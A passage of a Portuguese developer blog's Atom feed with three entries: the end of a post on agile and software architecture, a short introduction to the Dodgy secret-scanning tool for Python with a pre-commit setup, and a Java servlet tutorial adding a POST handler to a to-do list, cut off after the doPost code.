&lt;li&gt;&lt;a href="https://atomicobject.com/resources/oo-programming/crc-cards" title="CRC Cards"&gt;Cartões &lt;em&gt;CRC&lt;/em&gt;&lt;/a&gt;: Uma alternativa mais "barata" ao &lt;em&gt;UML&lt;/em&gt;, útil para descrever relacionamentos entre entidades.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ainda utilizando o contexto de orientação a objetos, outro tópico que pode aparecer nesse momento são os &lt;a href="https://klauslaube.com.br/tag/design-patterns.html" title="Leia mais sobre Design Patterns"&gt;&lt;em&gt;Design Patterns&lt;/em&gt;&lt;/a&gt;. No caso da construção de &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre APIs"&gt;&lt;em&gt;APIs&lt;/em&gt;&lt;/a&gt;, uma possibilidade é a construção do contrato via &lt;a href="https://klauslaube.com.br/2017/11/25/swagger-e-o-open-api-initiative.html" title="Swagger e o Open API Initiative"&gt;&lt;em&gt;Swagger file&lt;/em&gt;&lt;/a&gt;. Enfim, estamos mais próximos de ideias e artefatos que representem de fato o sistema.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/the-matrix-tank.gif" width="580" height="357" title="Existem ferramentas que te permitem abstrair todo aquele caractere verde escorrendo pelo seu monitor (reddit.com)" alt="Existem ferramentas que te permitem abstrair todo aquele caractere verde escorrendo pelo seu monitor (reddit.com)"&gt;&lt;/p&gt;
&lt;p&gt;Independente de qual estilo de programação você esteja usando, ou de qual região da aplicação você esteja desenvolvendo, é nesse momento que acontecem discussões sobre os &lt;em&gt;trade-offs&lt;/em&gt; entre as qualidades (&lt;em&gt;code quality&lt;/em&gt;, &lt;em&gt;security&lt;/em&gt;, &lt;em&gt;usability&lt;/em&gt;, &lt;em&gt;performance&lt;/em&gt;, &lt;em&gt;time to market&lt;/em&gt;, etc) definidas pelo contexto do seu projeto, bem como outros requisitos não funcionais, e como isso impactará o &lt;em&gt;design&lt;/em&gt; (e se o mesmo precisa ser alterado para encontrar o balanço ideal).&lt;/p&gt;
&lt;h2&gt;Onde cada um se encaixa?&lt;/h2&gt;
&lt;p&gt;Não é difícil imaginar o papel de &lt;em&gt;design&lt;/em&gt; sendo exercido no início de cada iteração, ou em &lt;em&gt;plannings&lt;/em&gt; e &lt;em&gt;groomings&lt;/em&gt;. Além disso,
ter essa responsabilidade diluída no time é natural em um contexto multidisciplinar.&lt;/p&gt;
&lt;p&gt;Ele pode acontecer também "ahead of time". Por exemplo, participei de projetos dos quais os "UXizes" estavam alguns &lt;em&gt;sprints&lt;/em&gt; na frente, em
relação aos desenvolvedores. Algumas decisões de &lt;em&gt;design&lt;/em&gt; são tomadas com antecedência, e os resultados são apresentados ao longo do tempo de vida do projeto.&lt;/p&gt;
&lt;p&gt;Já a arquitetura pode exigir um pouco mais de organização e criatividade. Já tive diferentes experiências com esse dilema "agile x software architecture":&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Todo mundo é arquiteto:&lt;/strong&gt; É o mesmo princípio do marco de &lt;em&gt;design&lt;/em&gt; ilustrado acima. Comum em &lt;em&gt;startups&lt;/em&gt; e empresas relativamente pequenas;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;A gerência é o arquiteto:&lt;/strong&gt; Pode acontecer de gerentes técnicos, &lt;em&gt;team leads&lt;/em&gt;, ou &lt;em&gt;CTOs&lt;/em&gt; "herdarem" essa responsabilidade. Outro cenário comum em &lt;em&gt;startups&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Um arquiteto por time:&lt;/strong&gt; O papel é atribuído a um grupo de pessoas que compartilha uma visão em comum, e essas transitam entre os times afim de manter a visão coesa. "Casa" com a proposta de &lt;a href="https://medium.com/productmanagement101/spotify-squad-framework-part-i-8f74bcfcd761" title="Spotify Squad framework — Part I"&gt;&lt;em&gt;squads&lt;/em&gt;, &lt;em&gt;chapters&lt;/em&gt; e &lt;em&gt;tribes&lt;/em&gt; do &lt;em&gt;Spotify&lt;/em&gt;&lt;/a&gt;;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Um time de arquitetos:&lt;/strong&gt; O mesmo fenômeno que pode acontecer com &lt;em&gt;UI&lt;/em&gt;/&lt;em&gt;UX&lt;/em&gt;. Nesse caso temos um time específico para arquitetura, com seu próprio processo e &lt;em&gt;backlog&lt;/em&gt;, e ele acaba colaborando com os demais times.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;E &lt;strong&gt;quando&lt;/strong&gt; ela deve ser exercida pode ser outro desafio. &lt;em&gt;Miguel Arlandy&lt;/em&gt; sugere o seguinte processo no &lt;a href="https://medium.com/quick-code/software-architecture-and-agile-are-they-both-really-compatible-c1eef0afcbb1"&gt;"Software Architecture and Agile. Are they both really compatible?"&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) As a rule, it would be recommended to do some upfront design at the beginning of the project (Sprint Zero?) and before the first iteration. Besides, we should include an “Architecture review” as part of the Definition of Done (DoD) in each user story. Of course within the Sprint Planning, this fact has to be taken into account. It would be worthwhile if at least one of the team members (if not all of them) will be accountable to ensure both product development and Architecture are aligned.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Uma das possíveis respostas para as perguntas do início desse &lt;em&gt;post&lt;/em&gt; é o conceito de &lt;a href="https://www.scaledagileframework.com/agile-architecture/" title="Agile Architecture in SAFe"&gt;&lt;em&gt;Agile Architecture&lt;/em&gt;&lt;/a&gt;, usado pelo &lt;a href="https://www.scaledagileframework.com/" title="Scaling Agile"&gt;&lt;em&gt;SAFe Framework&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) is a set of values, practices, and collaborations that support the active, evolutionary design and architecture of a system. This approach embraces the DevOps mindset, allowing the architecture of a system to evolve continuously over time, while simultaneously supporting the needs of current users. It avoids the overhead and delays associated with the start-stop-start nature and large-scale redesign inherent with phase-gate processes and Big Up Front Design (BUFD).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Onde, resumidamente, inicia-se com um pouco de &lt;em&gt;upfront design&lt;/em&gt; que é retroalimentado pelos &lt;em&gt;feedbacks&lt;/em&gt;, &lt;em&gt;design&lt;/em&gt; e decisões futuras dos times autônomos.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/safe-design-architecture.png" width="694" height="280" title="Exemplo de regulação entre arquitetura e design (medium.com)" alt="Exemplo de regulação entre arquitetura e design (medium.com)"&gt;&lt;/p&gt;
&lt;p&gt;Desse modo, teoricamente, é possível ter uma referência sólida de arquitetura, e ainda assim abrir espaço para inovação e alterações nessa referência. Outro aspecto interessante desse modelo é que é possível imaginá-lo com a proposta de &lt;em&gt;squads&lt;/em&gt; do &lt;em&gt;Spotify&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Acredito que o &lt;em&gt;agile&lt;/em&gt; e sua comunidade amadureceram o suficiente para compreender que alguns papéis mais "tradicionais" do desenvolvimento de &lt;em&gt;software&lt;/em&gt; precisam ser integrados à sua dinâmica. Quando em uma &lt;em&gt;startup&lt;/em&gt;, em que ainda é possível se ter a "visão do todo", é completamente natural que engenheiros/desenvolvedores assumam responsabilidades de &lt;em&gt;design&lt;/em&gt; e arquitetura. Mas em um contexto mais "enterprise", além de difícil, consome-se muito tempo "tentando tirar a cabeça da areia" e olhar em volta, principalmente se o processo esteja montado em torno de times autônomos.&lt;/p&gt;
&lt;p&gt;Independente de quem desempenhe tais papéis, essa característica "iterativa/incremental" que conceitos como o &lt;em&gt;Agile Architecture&lt;/em&gt; trazem são bem interessantes, e combinam completamente com os valores que desenvolvedores de &lt;em&gt;software&lt;/em&gt; mais se identificam quando adotando ferramentas ágeis.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://atomicobject.com/resources/oo-programming/crc-cards"&gt;Atomic Object - CRC Cards&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://codeburst.io/software-architecture-the-difference-between-architecture-and-design-7936abdd5830"&gt;Codeburst.io - Software Architecture: The Difference Between Architecture And Design&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.coursera.org/learn/object-oriented-design/home/welcome"&gt;Coursera - Object-Oriented Design&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dzone.com/articles/%E2%80%9C41%E2%80%9D-view-model-software"&gt;DZone - The “4+1” View Model of Software Architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.experienceux.co.uk/faqs/what-is-wireframing/"&gt;Experience UX - What is wireframing?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.lucidchart.com/pages/pt/o-que-e-diagrama-entidade-relacionamento"&gt;Lucidchart - O que é um diagrama entidade relacionamento?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@kostadisroussos/21-architecturalist-papers-always-be-right-right-now-1552af8dc330"&gt;Medium - 21 architecturalist papers: always be right, right now.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@designveloper.com/what-is-software-development-862fdcccd3b"&gt;Medium - What is Software Development?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/quick-code/software-architecture-and-agile-are-they-both-really-compatible-c1eef0afcbb1"&gt;Quick Code - Software Architecture and Agile. Are they both really compatible?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.scaledagileframework.com/agile-architecture/"&gt;Scaled Agile Framework - Agile Architecture in SAFe&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.uxpin.com/studio/blog/what-is-a-mockup-the-final-layer-of-ui-design/"&gt;UXPin - What is a Mockup: The Final Layer of UI Design&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.visual-paradigm.com/guide/uml-unified-modeling-language/what-is-uml/"&gt;Visual Paradigm: What is Unified Modeling Language (UML)?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.visual-paradigm.com/guide/uml-unified-modeling-language/modeling-software-architecture-with-package/"&gt;Visual Paradigm: Modeling Software Architecture with Packages&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.wikipedia.org/wiki/Requisito_n%C3%A3o_funcional"&gt;Wikipedia - Requisito não funcional&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="análise"></category><category term="arquitetura-de-software"></category><category term="design-de-software"></category><category term="agile"></category><category term="safe"></category></entry><entry><title>Assegure a qualidade do seu código Python - Dodgy</title><link href="https://klauslaube.com.br/2019/12/18/assegure-qualidade-seu-codigo-python-dodgy.html" rel="alternate"></link><published>2019-12-18T08:10:00-03:00</published><updated>2019-12-18T08:10:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-12-18:/2019/12/18/assegure-qualidade-seu-codigo-python-dodgy.html</id><summary type="html">&lt;p&gt;Ferramentas de &lt;a href="https://klauslaube.com.br/tag/qualidade.html" title="Leia mais sobre qualidade"&gt;qualidade de código&lt;/a&gt; parece um tópico com conteúdo infinito
quando o assunto é &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;. Hoje a dica é rápida e rasteira, de uma ferramenta
extremamente simples, mas que pode ser muito útil para dar aquele "up" no quesito segurança do seu projeto. Apresento-lhe
o &lt;a href="https://github.com/landscapeio/dodgy" title="Veja o repositório no Github"&gt;&lt;em&gt;Dodgy&lt;/em&gt;&lt;/a&gt;!&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Talk is cheap …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;Ferramentas de &lt;a href="https://klauslaube.com.br/tag/qualidade.html" title="Leia mais sobre qualidade"&gt;qualidade de código&lt;/a&gt; parece um tópico com conteúdo infinito
quando o assunto é &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;. Hoje a dica é rápida e rasteira, de uma ferramenta
extremamente simples, mas que pode ser muito útil para dar aquele "up" no quesito segurança do seu projeto. Apresento-lhe
o &lt;a href="https://github.com/landscapeio/dodgy" title="Veja o repositório no Github"&gt;&lt;em&gt;Dodgy&lt;/em&gt;&lt;/a&gt;!&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Talk is cheap...&lt;/h2&gt;
&lt;p&gt;Tudo começa com o nosso queridíssimo comando &lt;code&gt;pip install&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install dodgy
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E na sequência, com a execução do utilitário via terminal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cd ~/hello-world-em-django/
$ dodgy
{
    &amp;quot;warnings&amp;quot;: [
        {
        &amp;quot;path&amp;quot;: &amp;quot;hello_world/settings.py&amp;quot;,
        &amp;quot;line&amp;quot;: 23,
        &amp;quot;code&amp;quot;: &amp;quot;secret&amp;quot;,
        &amp;quot;message&amp;quot;: &amp;quot;Possible hardcoded secret key&amp;quot;
        }
    ]
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;Dodgy&lt;/em&gt; é uma ferramenta de código aberto, que tem
por objetivo utilizar expressões regulares para inspecionar o seu código e identificar problemas como &lt;code&gt;diffs&lt;/code&gt; esquecidos
nos arquivos, senhas expostas, e &lt;em&gt;secrets&lt;/em&gt; (como o exemplo acima) sendo "commitados". A biblioteca é extremamente simples,
e caso você não goste do "barulho" que o &lt;a href="https://klauslaube.com.br/2019/02/21/assegure-qualidade-seu-codigo-python-bandit.html"&gt;&lt;em&gt;Bandit&lt;/em&gt;&lt;/a&gt; faz, pode ser uma alternativa.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/dodge-this.png" width="740" height="415" title="Desvia disso! (vulturehound.co.uk)" alt="Desvia disso! (vulturehound.co.uk)"&gt;&lt;/p&gt;
&lt;p&gt;E claro, podemos utilizá-la com o &lt;a href="https://pre-commit.com/" title="pre-commit hooks"&gt;&lt;em&gt;pre-commit&lt;/em&gt;&lt;/a&gt;. Adicione o seguinte &lt;em&gt;snippet&lt;/em&gt; ao &lt;code&gt;.pre-commit-config.yaml&lt;/code&gt; do seu projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;repos&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;https://github.com/kplaube/pre-commit-dodgy&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;rev&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;0.0.1&amp;quot;&lt;/span&gt;
    &lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;dodgy&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos utilizá-la nos editores também. Ganhamos o utilitário "de graça" com o uso do &lt;a href="https://prospector.readthedocs.io/en/master/index.html" title="Python Static Analysis"&gt;&lt;em&gt;Prospector&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Para quem está dando os primeiros passos em direção a um controle mais apurado de um projeto, o &lt;em&gt;Dodgy&lt;/em&gt; pode ser uma boa pedida. Mas na realidade, se você está querendo de fato maior segurança, vá para o &lt;a href="https://github.com/PyCQA/bandit" title="Find common security issues in Python code"&gt;&lt;em&gt;Bandit&lt;/em&gt;&lt;/a&gt;, sem medo de ser feliz.&lt;/p&gt;
&lt;p&gt;Ou utilize o &lt;em&gt;Prospector&lt;/em&gt; e tenha os dois à disposição ¯\_(ツ)_/¯&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="qualidade"></category><category term="seguranca"></category><category term="dodgy"></category></entry><entry><title>Engatinhando em Java para a web - Parte 3</title><link href="https://klauslaube.com.br/2019/12/10/engatinhando-em-java-web-parte-3.html" rel="alternate"></link><published>2019-12-10T13:50:00-03:00</published><updated>2019-12-10T13:50:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2019-12-10:/2019/12/10/engatinhando-em-java-web-parte-3.html</id><summary type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2019/12/02/engatinhando-em-java-web-parte-2.html" title="Confira a parte 2"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt; falamos sobre a especificação
&lt;em&gt;Servlet&lt;/em&gt;, bem como sobre o uso de &lt;em&gt;JavaServer Pages&lt;/em&gt; e &lt;em&gt;Expression Language&lt;/em&gt;.
Para finalizar o protótipo proposto, e encerrar essa introdução ao &lt;a href="https://klauslaube.com.br/tag/java.html" title="Leia mais sobre Java"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt;,
precisamos implementar o método &lt;code&gt;POST&lt;/code&gt;, e durante esse percurso abordaremos os conceitos de &lt;em&gt;filters&lt;/em&gt; e &lt;em&gt;listeners&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;doGet e doPost&lt;/h2&gt;
&lt;p&gt;Recaptulando …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No &lt;a href="https://klauslaube.com.br/2019/12/02/engatinhando-em-java-web-parte-2.html" title="Confira a parte 2"&gt;&lt;em&gt;post&lt;/em&gt; anterior&lt;/a&gt; falamos sobre a especificação
&lt;em&gt;Servlet&lt;/em&gt;, bem como sobre o uso de &lt;em&gt;JavaServer Pages&lt;/em&gt; e &lt;em&gt;Expression Language&lt;/em&gt;.
Para finalizar o protótipo proposto, e encerrar essa introdução ao &lt;a href="https://klauslaube.com.br/tag/java.html" title="Leia mais sobre Java"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt;,
precisamos implementar o método &lt;code&gt;POST&lt;/code&gt;, e durante esse percurso abordaremos os conceitos de &lt;em&gt;filters&lt;/em&gt; e &lt;em&gt;listeners&lt;/em&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;doGet e doPost&lt;/h2&gt;
&lt;p&gt;Recaptulando o protótipo: Precisamos implementar a funcionalidade de adicionar uma tarefa ao &lt;em&gt;todo list&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/cypher-ignorance.jpg" width="740" height="416" title="Se continuar no Python é ficar na Matrix, pode me deixar lá (filmfoodsafari.wordpress.com)" alt="Se continuar no Python é ficar na Matrix, pode me deixar lá (filmfoodsafari.wordpress.com)"&gt;&lt;/p&gt;
&lt;p&gt;Se inspecionarmos o método &lt;code&gt;service&lt;/code&gt; da classe &lt;code&gt;HttpServlet&lt;/code&gt;, veremos que ele já se encarrega de determinar qual verbo &lt;em&gt;HTTP&lt;/em&gt;
está sendo utilizado pela requisição. Portanto, ao invés de sobrescrevê-lo, é mais eficiente implementarmos os métodos nos quais
queremos suportar.&lt;/p&gt;
&lt;p&gt;Renomeie o método &lt;code&gt;service&lt;/code&gt; para &lt;code&gt;doGet&lt;/code&gt;, e crie um método vazio para o &lt;code&gt;doPost&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@WebServlet&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urlPatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;OlaMundoServlet&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="n"&gt;HttpServlet&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;tarefas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ArrayList&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Tarefa A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
            &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Tarefa B&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
            &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Tarefa C&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;};&lt;/span&gt;

    &lt;span class="nd"&gt;@Override&lt;/span&gt;
    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;doGet&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HttpServletResponse&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;ServletException&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAttribute&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;tarefas&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tarefas&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

        &lt;span class="n"&gt;RequestDispatcher&lt;/span&gt; &lt;span class="n"&gt;rd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRequestDispatcher&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/WEB-INF/index.jsp&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;rd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forward&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="nd"&gt;@Override&lt;/span&gt;
    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;doPost&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HttpServletResponse&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note a alteração em &lt;code&gt;List&amp;lt;Tarefa&amp;gt; tarefas&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Com a seguinte adição de código ao método &lt;code&gt;doPost&lt;/code&gt; temos um protótipo que atinge o seu objetivo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@Override&lt;/span&gt;
&lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;doPost&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HttpServletResponse&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;ServletException&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;Tarefa&lt;/span&gt; &lt;span class="n"&gt;tarefa&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getParameter&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nome&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
    &lt;span class="n"&gt;tarefas&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;add&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tarefa&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAttribute&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;tarefas&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tarefas&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;RequestDispatcher&lt;/span&gt; &lt;span class="n"&gt;rd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRequestDispatcher&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/WEB-INF/index.jsp&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;rd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forward&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


